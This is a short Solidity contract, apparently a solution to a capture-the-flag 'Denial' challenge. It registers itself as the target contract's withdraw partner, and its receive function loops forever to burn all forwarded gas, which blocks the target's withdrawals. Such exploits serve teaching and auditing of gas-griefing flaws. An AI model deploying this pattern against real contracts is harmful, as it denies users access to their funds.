// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Denial.sol";

contract DenialAttack {
    Denial target;

    constructor(address payable _target) {
        target = Denial(_target);
    }

    receive() external payable {
        while (true) {}
    }

    function run() public {
        target.setWithdrawPartner(address(this));
    }
}
